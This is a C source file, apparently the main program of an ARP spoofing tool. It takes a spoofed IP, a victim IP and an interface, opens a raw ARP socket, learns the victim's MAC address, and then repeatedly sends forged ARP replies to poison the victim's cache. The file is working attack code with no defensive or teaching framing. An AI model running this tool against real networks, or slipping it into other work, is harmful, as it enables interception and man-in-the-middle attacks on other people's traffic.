#include "network/interface.h"
#include "network/network.h"
#include "utils/utils.h"

int main(int argc, char *argv[])
{
    char *victime_ip,
        *spoofed_ip,
        *interface;

    uint8_t my_mac_adress[ETH_ADD_L], victim_mac_adress[ETH_ADD_L];
    struct sockaddr_ll device;
    int sock, ret = 0;

    if (argc != 4)
    {
        help();
        return 1;
    }
    else
    {
        spoofed_ip = argv[1];
        victime_ip = argv[2];
        interface = argv[3];
    }

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0)
    {
        error("socket():");
        ret = 1;
    }
    else if (get_my_mac_adresse(sock, interface, my_mac_adress))
    {
        error("get_my_mac_adresse():");
        ret = 1;
    }
    else if (setup_sockaddr(&device, interface))
    {
        error("setup_sockaddr()");
        ret = 1;
    }
    else if (send_packet_to_brodcast(sock, &device, my_mac_adress, spoofed_ip, victime_ip))
    {
        error("send_packet_to_brodcast():");
        ret = 1;
    }
    else if (get_victim_response(sock, victime_ip, victim_mac_adress))
    {
        error("get_victim_response():");
        ret = 1;
    }
    else if (repeated_sending(sock, &device,
                              my_mac_adress, spoofed_ip,
                              victim_mac_adress, victime_ip))
    {
        error("repeated_sending():");
        ret = 1;
    }

    if (sock > 0)
        close(sock);

    return ret;
}
